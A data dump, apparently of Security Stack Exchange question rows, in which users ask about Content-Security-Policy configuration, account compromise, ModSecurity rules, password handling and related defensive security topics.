"190331","1","254653","","2018-07-25 05:58:34","","21","15095","<p>Recently, I've set Content-Security-Policy headers for my web application. I've tried to be as strict as possible. What strikes me most is the fact that I had to allow <code>blob:</code> for <code>connect-src</code> and <code>img-src</code> due to a third-party component. (Both <code>connect-src</code> and <code>img-src</code>  are otherwise restricted to <code>self</code> and some hard-coded URLs.)</p>

<p>So, my question is: Is allowing <code>blob:</code> a general security risk in the sense that an attacker can in an injected script wrap any URL with <code>blob</code> and thus connect to any arbitrary resource?</p>
","132742","","","","","2023-09-11 20:43:28","Is allowing blob: in Content-Security-Policy a risk?","<xss><content-security-policy>","1","1","0","","","CC BY-SA 4.0"
"123885","1","123891","","2016-05-21 14:20:31","","1","179","<p>I wrote a small website in PHP and ZF2. </p>

<p>Had a friend test it out by posting a link to it on Facebook. </p>

<p>Apparently I forgot to turn off ZendFramework reporting and he find an error. Posted a photo of the error. </p>

<p>In the photo it is exposed that I'm using ZF2 and my account's username, and paths to error exposing ZF2 file location. </p>

<p>/home/user/public_html,  things like that  </p>

<p><strong>Example</strong></p>

<pre><code>An error occurred
Additional information:
Zend\Mail\Transport\Exception\RuntimeException
File:
/home/username/public_html/domain.net/vendor/zendframework/zend-mail/src/Transport/Sendmail.php:290
Message:
Unable to send mail: 
Stack trace:
#0 [internal function]: Zend\Mail\Transport\Sendmail-&gt;mailHandler('mail &lt;mail@mail...', 'Your ...', 'Your Commission...', 'Date: Sat, 21 M...', ' -fservice@mail...')
#1 /home/username/public_html/domain.net/vendor/zendframework/zend-mail/src/Transport/Sendmail.php(138): call_user_func(Array, 'mail &lt;mail@mail...', 'Your ...', 'Your Commission...', 'Date: Sat, 21 M...', ' -fservice@mail...')
#2 /home/username/public_html/domain.net/module/Commission/src/Mail/Mail.php(22): Zend\Mail\Transport\Sendmail-&gt;send(Object(Zend\Mail\Message))
</code></pre>

<p>(username and domain and emails in message above are altered)</p>

<p>Is the text on the photo endangering my security?</p>

<p>Do I ask him to take it down? </p>
","111264","","111264","","2016-05-21 22:22:37","2016-05-21 22:22:37","Does an image showing exception error on my site pose a prominent security risk?","<web-application><php><user-names><account-security><exposure>","2","3","","","","CC BY-SA 3.0"
"190466","1","190468","","2018-07-27 05:05:37","","-1","228","<p>I have 69 Administrators in AD and I have noticed they are doing all kinds of whacky (and untrustworthy) things.</p>

<p>This is an audit <strong>nightmare</strong>, and I was wondering if there is a way to disable an Admin on, say, every Monday and Wednesday?</p>
","183024","","123514","","2018-07-27 08:08:02","2018-07-27 11:08:01","How to limit Administrators by day of the week","<account-security><active-directory>","3","3","","","","CC BY-SA 4.0"
"262378","1","","","2022-05-30 10:36:01","","2","678","<p>My understanding is that:</p>
<ul>
<li>SVGs offer far greater functionality if they are directly embedded in a site's HTML code via the <code>&lt;svg&gt;</code> tag than if they are linked to via the <code>&lt;img&gt;</code> tag
<ul>
<li>For example, if the <code>&lt;svg&gt;</code> tag is used, it is possible to dynamically change colors of certain parts of an SVG or even move parts around from JavaScript. Consider this SVG as a possible use case: <a href=""https://freesvg.org/old-round-clock"" rel=""nofollow noreferrer"">https://freesvg.org/old-round-clock</a> A site's JS code could rotate the clock's hands to make them show the current time, but only if the clock is embedded with the <code>&lt;svg&gt;</code> tag</li>
</ul>
</li>
<li>However, SVGs very frequently have inlined styles. For example, the above clock includes this piece of code:</li>
</ul>
<pre><code>      &lt;rect
         transform=&quot;matrix(0.87719078,0.480142,-0.480142,0.87719078,0,0)&quot;
         ry=&quot;1.75&quot;
         y=&quot;269.82101&quot;
         x=&quot;564.13495&quot;
         height=&quot;9.75&quot;
         width=&quot;9.75&quot;
         id=&quot;rect3049&quot;
         style=&quot;fill:url(#radialGradient3051);fill-opacity:1;stroke:none&quot; /&gt;
</code></pre>
<p>This is precisely what CSP strives to forbid. Therefore, including the above SVG on a CSP protected site breaks this SVG, at least if the SVG is included via the <code>&lt;svg&gt;</code> tag.</p>
<p>There are at least two ways to remedy the problem, unfortunately both are unsatisfactory:</p>
<ul>
<li>Inline styles in SVGs can be exempted from protection in the CSP policy. However, this seems to defeat the point of using CSP. Note that exempting hashes cannot be employed in this case.
<ul>
<li>This would be even more the case if JavaScript in SVGs would have to be exempted as well. And if the above approach was pushed to its logical end then it would make perfect sense to include JS in the clock SVG, for example to let the user manually set time by dragging hands with the mouse pointer.</li>
</ul>
</li>
<li>Inline styles can be removed from the SVG and placed in an external stylesheet. Then a the full range of protections offered by CSP could remain enabled.
<ul>
<li>This would be very tedious and would arguably result in code that would be difficult to maintain and follow, since an image would have to be split into multiple files included separately in the website.</li>
</ul>
</li>
</ul>
<p>Is there any possibility I'm missing? Is it possible to, in a practical way, include SVGs on a webpage with the <code>&lt;svg&gt;</code> tag while still having CSP fully enabled?</p>
","108649","","5541","","2022-05-30 15:14:40","2023-07-25 12:02:20","Is it practically possible to use SVGs to their full potential while still enjoying all protections offered by Content Security Policy (CSP)?","<content-security-policy><svg>","2","1","","","","CC BY-SA 4.0"
"262429","1","262499","","2022-06-01 17:57:25","","0","628","<p>On an small audience highly confident web application we are about use CSP to add a level of security. Most parts of the application could be moved to script files and script-src set to 'self' would be sufficient.  Some parts however still have to use inline scripts. PHP Session IDs are recreated on a regular basis. We're considering creating a nonce for the remaining cases. Would this code be sufficient for this case?</p>
<pre><code>$nonce = base64_encode(sha1(session_id()));
</code></pre>
<p>upon logoff we reset the session id.
Would this setup offer a reasonable level of CSP protection?</p>
","34427","","","","","2023-06-17 19:06:01","nonce generation based on php session id","<php><content-security-policy>","2","1","","","","CC BY-SA 4.0"
"124029","1","","","2016-05-23 20:26:26","","0","144","<p>I was reading  this answer on a question.</p>
<p><a href=""https://security.stackexchange.com/a/498/106817"">https://security.stackexchange.com/a/498/106817</a></p>
<blockquote>
<p>Recently, at the OWASP AppSec 2010 conference in Orange County, Bill Cheswick from AT&amp;T talked at length about this issue.</p>
<p>....</p>
<p><strong>Allow a trusted party to vouch for the user, so he can change his password.</strong></p>
</blockquote>
<p>Granted, I know this is 6 years old at this point, but....</p>
<p>I was curious, is there really any added security to this?  By &quot;trusted party&quot; is that assumed to be a friend, or someone else who is already authorized, or is it a site/app admin?</p>
<p>If someone is locked out of their account so much that they cannot use their email, or even the backup email for their main email, then how would their password be reset to begin with?  Would it be given by this &quot;Trusted source&quot; to another email, or possibly over the phone/text (if friend).</p>
<p>So is there any way a hacker could hack Account A, which vouches Account B, and then do something malicious to Account B?  It says &quot;Trusted-party&quot; so if the party ends up not being trusted, what's the worst that could happen?</p>
<p>I know some games implement &quot;Vouchers&quot; which you gained stuff if you vouch a friend and bring them to the game, but I've never seen a voucher responsible in case their friend is locked out...</p>
<p>Any comments towards this?  Thanks.</p>
","106817","","-1","","2020-06-16 09:49:05","2016-05-23 23:56:21","Is there any added security/vulnerabilities if you allow a ""trusted-party"" to vouch you are legit, if you were locked out of your account?","<authentication><passwords><authorization><third-party><account-security>","2","0","","","","CC BY-SA 3.0"
"262456","1","","","2022-06-02 21:18:46","","0","89","<p>I found in my Google admin logs that someone from outside my organization is trying to log in frequently by testing all our user accounts against weak passwords. I'm wondering how could that happen?</p>
<p>How did he manage to get the correct list of all our users' accounts? How can he attack Google servers and verify our accounts only. Is it our domain problem? It doesn't make sense to me the attacker didn't even log in to any of the user's computers or took any passwords. Can anyone explain what is going on?</p>
","278927","","6253","","2022-06-03 10:15:41","2022-06-03 10:15:41","How could attacker know user names of my Google Workspace?","<attacks><account-security><google-apps><google-cloud-platform>","1","11","","2022-06-04 14:30:16","","CC BY-SA 4.0"
"190742","1","","","2018-08-01 03:38:11","","2","108","<p>A lot of us will be familiar with UML for software engineering. Its uses are plentiful.</p>

<p>Is there such a thing as a set of conventionally used diagrams for modelling any security scenario (speaking as a complete beginner to the field of security).</p>

<p>For example, if I wanted to sketch out all the different ways a client's password database could be breached, given that she has situations like the file being stored in the cloud, 2FA with a physical key, application on her phone, etc.</p>

<p>The idea would be to have a clear, pictographical overview of the situation, and ideally be able to easily see flaws or how to best optimise the security given the person's lifestyle.</p>
","176252","","","","","2019-04-09 22:29:08","Is there a diagram based language for modelling security?","<account-security>","1","0","","","","CC BY-SA 4.0"
"190813","1","","","2018-08-01 20:23:10","","3","3964","<p>I have read up on <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri"" rel=""nofollow noreferrer"">base-uri</a> and the <a href=""https://stackoverflow.com/q/1889076/461834"">HTML base tag</a>, but what exactly is the <code>base-uri</code> CSP is meant to protect against?</p>
","5997","","","","","2018-08-02 06:27:21","What attacks does Content Security Policy base-uri protect against?","<html><content-security-policy>","2","0","","","","CC BY-SA 4.0"
"190924","1","190929","","2018-08-03 16:41:58","","15","4626","<p>Today I opened a bank account to invest my savings. Here's the link to the login page: <a href=""http://www1.directatrading.com/"" rel=""nofollow noreferrer"">http://www1.directatrading.com/</a></p>

<p>I noticed it doesn't use Https protocol (neither is that page nor in the landing page where you can buy stocks etc).
Moreover your password can be at maximum 10 characters long and there's no 2 step verification...</p>

<p>This is the page where they explain their security (it's Italian, maybe you could translate: <a href=""https://www.directa.it/pub2/it/altreinfo/sicurezza.html"" rel=""nofollow noreferrer"">https://www.directa.it/pub2/it/altreinfo/sicurezza.html</a>).</p>

<p>Thanks for any input.</p>

<p>It's a large broker company so it seems strange to me they don't care that much about security (however I'm no expert). </p>
","70846","","70846","","2018-08-05 08:06:49","2018-08-05 08:06:49","Is this bank website secure enough? No https in login page","<passwords><http><web-service><account-security>","3","1","","","","CC BY-SA 4.0"
"190950","1","190951","","2018-08-04 07:06:27","","3","796","<p>I'm working on an application that will have access to API keys supplied by our users. The application makes API calls on behalf of our users.</p>

<p>The API we're using allows users to whitelist IP addresses that can use their API keys. I was thinking of telling our users to whitelist the app's IP address in order to add a further layer of security, so that only requests coming from our IP address would be allowed.</p>

<p>But I've read it's fairly easy to spoof IP addresses and considering I'm going to be telling our users what IP address to whitelist (meaning, a bad actor wouldn't have to work too hard to see which IP addresses are valid), I'm wondering if this is even worth the effort?</p>

<p>If a malicious actor were to somehow get their hands on the users API keys, would IP address whitelisting really add any meaningful layer of security? Or would this just be a minor inconvenience at best for the bad actor?</p>

<p>Thanks!</p>
","183551","","","","","2018-09-03 08:00:55","Is IP address whitelisting useful if the IP address is not “secret”?","<network><appsec><audit><account-security><ipsec>","1","0","","","","CC BY-SA 4.0"
"262844","1","","","2022-06-20 07:54:26","","0","371","<p>I was reading this documentation <a href=""https://cheatsheetseries.owasp.org/cheatsheets/AJAX_Security_Cheat_Sheet.html#server-side"" rel=""nofollow noreferrer"">https://cheatsheetseries.owasp.org/cheatsheets/AJAX_Security_Cheat_Sheet.html#server-side</a></p>
<p>One of the security recommendation is - Always return JSON with an Object on the outside</p>
<p>And showing an example that this can be exploitable -</p>
<p><code>[{&quot;object&quot;: &quot;inside an array&quot;}]</code></p>
<p>But this can <strong>not</strong></p>
<p><code>{&quot;object&quot;: &quot;not inside an array&quot;}</code></p>
<p>Now can anyone give me an practical example why the above one is exploitable and in what condition? And why the below one can not be exploitable?</p>
","163122","","","","","2022-06-21 07:45:34","How this JSON object can be exploitable?","<account-security><ajax>","0","2","","","","CC BY-SA 4.0"
"124514","1","","","2016-05-29 13:51:47","","1","208","<p>The scenario is that we have 3 tier architecture DMZ > BEA > DB with end to end encryption the data is encrypted within DMZ > BEA > DB.</p>

<p>I have read that modsecurity doest deal with encrypted traffic it is positioned in Apache in a way that after mod_ssl decrypts the traffic, modsecurity analyze the un-encrypted traffic.</p>

<p>Now after modsecurity analyze the decrypted traffic, in three tier arch it will be passed to BEA, now will that traffic be encrypted? Like after modsecurity does its thing, will that traffic again pass through mod_ssl to encrypt and send to BEA or it will be send directly to BEA after modsecurity as unencrypted? </p>

<p>Thanks </p>
","54600","","","","","2016-05-29 19:50:20","Modsecurity Encrypted traffic in 3 tier architecture","<encryption><web-application><apache><mod-security>","1","0","","","","CC BY-SA 3.0"
"263013","1","","","2022-06-27 18:05:07","","1","104","<p>Over the years I've noticed that more and more login pages implement an eye icon next to the password field, that on click toggles between hidden and plaintext view of the password typed in that field.</p>
<p>Why is this feature becoming more widespread? Why would various companies spend time, effort and money implementing a feature that increases the risk of account hijacking?</p>
","157823","","6253","","2022-06-27 18:05:46","2022-06-27 18:08:12","Displaying a user's password in plaintext on login pages. Why is this practice becoming more widespread?","<passwords><account-security>","0","2","","2022-06-27 18:07:11","","CC BY-SA 4.0"
"191164","1","191783","","2018-08-08 05:27:24","","0","712","<p>Here, I'm trying to accomplish calling a Lua script from modsecurity rules.</p>

<p>There are 2 components:-</p>

<p>1.example.com (WAF)</p>

<p>2.test.com (Web Application)</p>

<p>test.com contains pages:-</p>

<pre><code>index.php
protectedpage.php
</code></pre>

<p>If user accesses <code>http://example.com/protectedpage.php</code> the rule loads the lua script and writes data to lua_output.txt . </p>

<p>I have been stuck here for past 2 days trying several variations.</p>

<blockquote>
  <p>Contents of /etc/apache2/sites-enabled/example.com.conf</p>
</blockquote>

<pre><code>&lt;VirtualHost *:80&gt;
    ServerAdmin admin@example.com
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/example.com/public_html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    ProxyPreserveHost On
    ProxyRequests Off

    LoadModule security3_module /home/testuser/spiderlabs/ModSecurity-apache/src/.libs/mod_security3.so
    &lt;IfModule security3_module&gt;
            modsecurity_rules 'SecRuleEngine On'
            modsecurity_rules 'SecRequestBodyAccess On'
            modsecurity_rules 'SecResponseBodyAccess On'
            modsecurity_rules_file ""/etc/apache2/modsecurity.d/include.conf""
            modsecurity_rules 'SecAuditLogFormat JSON'
    &lt;/IfModule&gt;

    #Access to /getprotected 
    modsecurity_rules 'SecRule REQUEST_FILENAME ""^/getprotected.php$"" ""phase:2, t:none, t:normalisePath, t:lowercase, t:urlDecodeUni, chain, deny, log, id:1301""'
    modsecurity_rules 'SecRuleScript /etc/apache2/lua/checkaccess.lua \
    ""id:400,Phase:2""'

    ProxyPass /getprotected.php !
    ProxyPass /getpassword.php !
    ProxyPass / http://test.com:8080/
    ProxyPassReverse / http://test.com:8080/
</code></pre>

<p></p>

<blockquote>
  <p>Contents of /etc/apache2/lua/checkaccess.lua</p>
</blockquote>

<pre><code>   #!/usr/bin/lua

    function main()
        local f = assert(io.open('/etc/apache2/lua/lua_output.txt','a'))
        f:write(""--- Hello world ---\n"")
    end
</code></pre>

<p>The Rule is executed. But the script is not. I'm not sure whether its chaining or not.
please Let me know how to fix this.
Thanks,</p>

<p>References so far:-
1. <a href=""https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29"" rel=""nofollow noreferrer"">ModSecurity Documentation</a></p>

<ol start=""2"">
<li><p><a href=""https://gryzli.info/2015/12/25/modsecurity-using-lua-scripts-with-secrulescript/"" rel=""nofollow noreferrer"">Lua scripting blog 1</a></p></li>
<li><p><a href=""https://www.htbridge.com/blog/patching-complex-web-vulnerabilities-using-modsecurity-waf.html#improper_access_control"" rel=""nofollow noreferrer"">blog 2</a></p></li>
</ol>
","179614","","179614","","2018-08-10 06:31:57","2018-12-15 23:03:45","Cookie Operations using Modsecurity Rules","<apache><mod-security>","1","4","","","","CC BY-SA 4.0"
"191330","1","191338","","2018-08-10 13:10:59","","2","263","<p>Yesterday I received two (authentic) e-mails from Google saying they prevented sign-in attempts to two (very old) google accounts of mine. Google says they used the correct passwords, which turned out to be very old passwords that I had not changed, simply because I have not used these accounts in a <strong>very</strong> long time (more than 5 years).</p>

<p>This is the first thing that struck me as very odd. I had basically never used even used these accounts for anything. As far as I can remember, I may have signed up with them for an Apple ID, but let's move on.</p>

<p>The thing they did have in common for certain was the recovery e-mail.</p>

<p>Now, I wasn't going to ask a question about this here at first, because it's probably nothing that can be answered here.</p>

<p>However, today I was told by a relative that one of her (old and pretty much unused) Google accounts was also attacked with the correct password (around the same time yesterday). This account was likely setup by me for her and may be linked in one way or another to some of my Google accounts (either through exchange of communication or recovery email).</p>

<ol>
<li><p>Neither of these accounts or <a href=""https://www.troyhunt.com/ive-just-launched-pwned-passwords-version-2/"" rel=""nofollow noreferrer"">passwords(!)</a> is present on <a href=""http://haveibeenpwned.com"" rel=""nofollow noreferrer"">http://haveibeenpwned.com</a></p></li>
<li><p>Neither of these accounts has been used in a while and was never used much at all</p></li>
<li><p>All of these accounts appear linked</p></li>
</ol>

<p>I am not asking you to speculate about what happened here in particular, but is there a reasonable explanation of how those accounts may have been compromised?</p>

<p>My most likely explanation would be that another (linked) account got compromised and these e-mail addressed where extracted from there?</p>

<p>Or should I consider my personal computers to be compromised as this sort of information could technically have been extracted from there?</p>

<p>I am usually a reasonable cautious person, using a password manager, etc. and I already changed all the passwords to these accounts, but is it also considered good practise in this case to rebuild my personal machines?</p>

<p>I am looking for advice here, because I can't wrap my head around how those specific (old and very rarely used) credentials could have gotten leaked.</p>
","102009","","102009","","2018-08-10 14:33:18","2018-08-10 15:40:29","Concerted attack on linked google accounts?","<google><account-security>","1","4","","","","CC BY-SA 4.0"
"124941","1","124954","","2016-06-02 18:48:27","","3","1530","<p>Here's a scenario that I often encounter:</p>

<ol>
<li>Some user needs access to something on my network, but they don't have an existing account in AD.</li>
<li>I create an AD account for them which I then use to allow access to an SSL VPN or an SFTP account or whatever.</li>
</ol>

<p>I typically send an email with detailed connection instructions and text them a password.  I often use a <a href=""https://identitysafe.norton.com/password-generator/"" rel=""nofollow"">free service provided by Norton</a> to generate a random password with >= 8 chars.</p>

<p>Without knowing what algorithm Norton uses to generate these random char strings, the question is, is this secure?  The site I'm using to generate the passwords is SSL and I'm texting the password to the user, thereby separating the instructions (via email) from the required password.</p>

<p>How could I approach this problem differently in order to make the process more secure without having the ability to have the end user set their own password?</p>
","70417","","","","","2017-11-22 05:04:13","Are password generators secure?","<passwords><random><account-security>","2","4","","","","CC BY-SA 3.0"
"263297","1","","","2022-07-11 20:00:03","","0","34","<p>I have one Spring boot Web application which has few apis facing internet, deployed on aws, they work on JWT token, they're fairly secure. But there are few apis that work on static token validation. They are used for asynchronous operation such as sending emails from lambda etc. These type of apis seems to be somewhat vulnerable, if token gets leaked somehow. What else can be applied as security measures on these type of apis? Token rotation is one way but it has become tedious because there are multiple services that need this type of operation and tokens are stored at multiple places. I'm thinking one additional layer of ip whitelisting that we receive in x-forwarded-for http request. But I tried to overwrite it from Postman and x-forwarded-for header became a comma seperated list ['ip_that_i_put_in_header', 'my_machines_public_ip']. So I guess this can be overwritten. I think it is useless. Even if I do IP whitelisting,how to get CIDR from aws that should be whitelisted? Anything else that I can do?</p>
","280311","","","","","2022-07-11 20:00:03","SpringBoot Web Application Security for apis working on static token?","<web-application><account-security>","0","2","","","","CC BY-SA 4.0"
"263347","1","","","2022-07-13 23:34:12","","0","260","<p>Is a Google login actually any more secure than a username and password login?</p>
<p>Assuming the username + password uses encrypted passwords in the DB and a 1 week access token, I don't really see how it would be more secure.</p>
","280030","","","","","2022-07-13 23:57:57","Google Login vs. Username + Password","<account-security>","1","0","","","","CC BY-SA 4.0"
"191449","1","191450","","2018-08-13 05:43:38","","2","904","<p>We have a multi-page web application. I understand that ideally CSP should be set for text/html responses only. Is it enough to add content security policy (CSP) header to the login page or should I add the header to each &amp; every page?</p>

<p>Did not find any supporting csp documentation to check this.</p>
","183904","","","","","2018-08-13 05:52:35","Do we need to add CSP to all web pages in a web application?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"191455","1","191457","","2018-08-13 08:40:33","","7","6451","<p>As mentioned in the Content Security Policy documentation &amp; from the ""supported browsers"" page on the CSP site, CSP is not supported in Internet Explorer.</p>

<p>So, if we want to support CSP in our application with all the supported browsers which includes IE, what is the approach that one should follow? Is there any alternative to CSP (X-Content-Security-Policy is already deprecated) for IE?</p>

<p>I observed that Facebook.com uses CSP headers with Chrome but doesn't use any alternative of CSP with IE. I came across the iframe header which can be used in place of CSP but couldn't work out how.</p>
","183904","","","user173641","2018-08-13 08:58:18","2018-08-13 08:58:18","What's the alternative of content security policy (CSP) header in Internet Explorer IE?","<content-security-policy><internet-explorer><iframe>","1","0","","","","CC BY-SA 4.0"
"191460","1","191490","","2018-08-13 09:31:43","","236","34627","<p>I recently had to authenticate myself online to use an internet-based service. The authentication process was done via video call with me holding my ID card in front of my laptop camera beside my face. I also had to wiggle the ID card so the person on the other end of the video call could see the security features that are printed on the ID card.</p>

<p>Then the person asked me to wave my hand in front of the ID card, so that it was shortly fully covered by my hand several times. </p>

<p>What is this method supposed to achieve or is this just security theater?</p>
","86741","","","","","2018-08-17 08:28:13","Why did I have to wave my hand in front of my ID card?","<authentication><security-theater>","3","2","","","","CC BY-SA 4.0"
"263408","1","263410","","2022-07-16 08:24:22","","0","66","<p>On my school website I can list all existing accounts in the system to send them a message. Each account has a logo showing the user role (admin, professor or student) and I can directly filter on it.</p>
<p>As I know some of these peoples are likely to click on a link I send them via chat. Is it a bad security practice ?</p>
<p>Or the act to hide the roles only adds a minimal effort to threat actor ?</p>
","280502","","","","","2022-07-16 12:06:09","Does showing the permission level of an account to all users a bad security practice?","<account-security>","2","0","","","","CC BY-SA 4.0"
"191570","1","191571","","2018-08-14 23:31:54","","2","219","<p>Background scenario:</p>
<p>So we had a problem where our system (<em>Alice's shiny widgets</em>) generated a PDF with a quote amount for 10 widgets. Someone (Eve) took the PDF, altered it to increase the price by 20%, they then presented the PDF as an expense claim to their boss; hoping to pocket the 20% difference! The boss (Bob) knew what the  normal price should be, and accused us of price gouging. Very embarrassing for CEO Alice. Fortunately we has a backup copy of the original PDF. Eve 'was let go'...</p>
<p>CEO Alice said they didn't want that to happen again. So CTO Charlie said: 'Fix it with signed PDFs'</p>
<p>My question is, will that help?</p>
<p>Is there anything forcing Bob to check if the PDF is signed?</p>
<p>What stops Eve2.0 from copying the content of the signed PDF, altering it herself, and then signing herself (perhaps with cert named 'Alice's shiny widget<strong>z</strong>'?</p>
","45228","","45228","","2021-07-30 08:27:40","2021-07-30 08:27:40","How useful is PDF signing in real world usage?","<digital-signature><pdf><design-flaw><security-by-design>","1","0","","","","CC BY-SA 4.0"
"191590","1","","","2018-08-15 11:05:52","","127","26812","<p>My friend just asked me: ""why is it actually that bad to put various passwords directly in program's source code, when we only store it in our private Git server?""</p>

<p>I gave him an answer that highlighted a couple of points, but felt it wasn't organized enough and decided this might make sense to create a canonical question for.</p>

<p>Also, how does not storing passwords in the source code relate to principle of least privilege and other foundations of information security?</p>
","15648","","15648","","2018-08-15 11:10:22","2019-12-30 10:53:49","Why is storing passwords in version control a bad idea?","<account-security><source-code><credentials><threat-modeling><insider-threats>","8","15","","","","CC BY-SA 4.0"
"263564","1","263568","","2022-07-23 15:07:55","","29","10680","<p>I got an Email (to my iCloud address) from Disney+. The email contained a subscriber agreement. I did not register for their service myself. On the Disney+ website I saw that there was indeed an account for my email address. Using &quot;forget password&quot; I was able to log into the account and change the password.</p>
<p>I contacted Disney support, asking them to delete the account. However, they said that they can not delete the account since there is a running subscription via iCloud. This subscription has to be cancelled in order for the account to be deleted.</p>
<p>At this point I was very concerned that someone has hacked into my iCloud (which runs under email address used for the Disney+ account). So I logged into my iCloud and checked the running subscriptions and active devices but there was no suspicious activity at all and no Disney+ subscription listed.</p>
<p><strong>My questions are:</strong></p>
<ul>
<li>is it technically possible that the Disney+ Account is connected to
my email-address but using a different (unknown) iCloud account for
the subscription?</li>
<li>are there any security concerns for me or have I just randomly be given
a free Disney+ account (by someone else's mistake)?</li>
</ul>
","280772","","-1","","2022-07-26 07:55:20","2022-07-26 07:55:20","Someone created a Disney+ account with my e-mail address. Are there any security concerns?","<account-security><icloud>","3","12","","","","CC BY-SA 4.0"
"191733","1","","","2018-08-17 04:02:54","","0","335","<p>I had never thought much about this until the only account on my home PC somehow lost admin
privileges (changing to guest - I suspect this is a Microsoft bug but will probably never know).
So, eventually, I solved this problem by doing a safe boot, logging in with the never-before-used
built-in ""Administrator"" account and its blank password, and then making my real account an
administrator.</p>

<p>Since it seems that anybody can safe boot my computer (e.g., from the off state by booting and
cutting the power three times in a row), I guess I need to change my Administrator password,
right?  If I don't change it, even if I encrypt my hard drive, this Administrator has access to
all my files, right?</p>

<p>It seems Windows 10 should at least have told me something like ""The built-in Administrator
password is blank - Would you like to change it?"" to give me a conscious decision when I first
bought this computer, so I'm doubting myself...am I making some sort of mistake about how
serious this is?</p>
","35640","","","","","2018-08-17 09:21:11","Should I change my built-in Administrator password?","<account-security><windows-10>","2","0","","","","CC BY-SA 4.0"
"191938","1","","","2018-08-20 11:21:37","","1","214","<p>I'm designing a database interface for a system that could store PII. My first focus is on making sure all the data is secure, to do this I have designed the system as follows.</p>

<p>I'm running three separate servers with three separate roles. Server 1, the web interface (Which I will refer to as El Jefe), takes requests from users and processes them, and returns the appropriate information as needed.</p>

<p>Server 2, the cryptographic interface (Which I will refer to as the Bagman) receives information via SSL from El Jefe and encrypts it (Using the Halite interface from Paragon Initiative Enterprises), then passes it on to server 3.</p>

<p>Server 3, the database (Which I will refer to as the Stash) stores the encrypted information it receives from the Bagman. It does not have the encryption keys from the Bagman or anything else like that.</p>

<p>Right now, the data at rest is secure. If the Stash somehow gets broken into, none of the files mean anything and none of the entries in the database mean anything because they're all encrypted, and none of the keys are stored on that server.</p>

<p>However, if the Bagman gets broken into, then all information that gets passed through him can be stolen.</p>

<p>Additionally, if El Jefe gets compromised, he can issue instructions to the Bagman to retrieve, decrypt, and return anything located in the Stash.</p>

<p>To mitigate against this I had the following plan: To minimize any damage from a breach of either El Jefe or of the Bagman I was going to salt the encryption key with a SHA2 hash of the user's password, so even if someone breaks into the Bagman, the keys are worthless without the additional hash of the user's password. However I feel like this falls into the realm of ""Rolling your own crypto"", which based off my readings for the past 2 weeks is a No-Go. Additionally, I would run into the issue of if a user forgets their password then there is no way to recover their files. Or if they decide to change their password I would have to decrypt, then re-encrypt all of their files.</p>

<p>I apologize for the corny names of the servers, by the way. It helps me remember their roles and visualize what they're doing in my mind. If you can point me in the direction of any resources or additional readings or whitepapers on designing a secure system like this, it would be much appreciated.</p>
","184652","","","","","2018-08-20 18:41:11","Can you tell me if my design is secure?","<databases><security-by-design><pii>","1","3","","","","CC BY-SA 4.0"
"263894","1","","","2022-08-04 22:18:46","","-1","122","<p>We have added HSTS policy at Akamai level (domain). When we Intercept the request using burp we dont see HSTS policy is getting added in response, in case we hit site with http.</p>
<p>But with https we able to see the HSTS policy.</p>
<p>Issue is to fix this on http also. Can any expert provide some solution around it from the knowledge one has?</p>
<p>Thanks,</p>
","281282","","","","","2023-01-07 18:01:30","HSTS Policy Not Appear in Burp Intercept Response","<burp-suite><content-security-policy><hsts>","2","3","","","","CC BY-SA 4.0"
"263935","1","","","2022-08-05 21:54:02","","0","43","<p>So I did this post before on a guest account but I had further questions so now I'm posing it on a real one.</p>
<p>Can my employer see my private google history/”google activity” if I didn’t do anything on my work pc? For some context I logged in to my private google account on my work computer just to send a pdf file I couldn’t send on my phone. I logged into my google account on microsoft edge, but in private/incognito mode. But I was only logged in for about like 10 seconds because when I went to “google.com” I saw my previous searches from another device appear as recomendations on what to search. Note that google sync is disabled so that shouldn't happen, but appearntly google web and app activity still auto-completles your searches based on your previous google searhes across all devices. I instantly changed password and logged out. I didn't know that “google activity” has an option that gives the opportunity to see the search history of the account no matter what device you’re logged in on if it's enabled if you go to &quot;https://myactivity.google.com/myactivity&quot;. I also saw that edge had some kind of extention that allowed all data to be read by the work organisation. The recomendations for autocomplete searches only came up on the site “google.com” for some more context, and nowhere else. So my Question is, Even though I didn’t search anything or do anything on my google account, can my employer/work still see/download my previous history stored on my google account or anything like that because I logged in on the work computer? I really was only signed in for maximum of like 10-15 seconds and I never checked my history while being logged in there. I just don’t want to get in trouble if I ever googled something unpopular.</p>
<p>Also even though I switched passwords and anything could my employer still see and access new activity on my google account even though I logged out and switched passwords? I mean, is it somehow now connected to their servers and did my google account just become an account associated to them in some way?</p>
","281309","","","","","2022-08-05 21:54:02","Can my employer see my private google account history when just logging in and out in a matter of 10 seconds on a work laptop (REPOSTED)","<privacy><account-security><logging>","0","2","","2022-08-30 18:11:35","","CC BY-SA 4.0"
"192152","1","","","2018-08-23 05:15:58","","1","133","<p>(The name is vague on purpose because I'm not entirely sure how bad of an issue this is or if it is well known yet and I don't want to accidentally leak some kind of major breach type thing)</p>

<p>Scenario: You change your password to your Gmail/Yahoo email account on the computer using the website. You then go to your iPhone and attempt to pull up the built in mail app. Somehow it works, but only with the <em>old</em> password. You try deleting the account from the phone completely and then relogin and set it up. Nothing works. The old password stays logged in. So you test this. You observe that it takes roughly <strong>1.5 - 2 weeks</strong> before the password change takes effect. Unfortunately you didn't try logging in with a new device to see what would happen, but it's easy to guess what <em>might</em> happen.</p>

<p>So now this all boils down to the root of it all: What actually causes this and <strong><em>is it a security issue</em></strong>? I know from having multiple accounts over the years and some requiring me to change the passwords regularly as a rule because it wasn't a personal email that this pretty much always occurs. I also know it isn't specifically me or my phone that is the cause. Multiple relatives have asked me for help wondering why they couldn't log in. I told them to try the old password and they said it worked. So it is definitely not local to just me or something I do with my phone. I don't have a random phone lying around to just test so I obviously cannot determine if this would happen with phones that were never logged in previously. However, all of this is an obvious issue if a password were ever compromised and a decent rule of security is to assume that any exploit such as this that any random Joe stumbles upon (and has to use it as a rule of thumb lest their be logged out for two weeks) has already been found and <strong>is being exploited</strong> by hackers.</p>

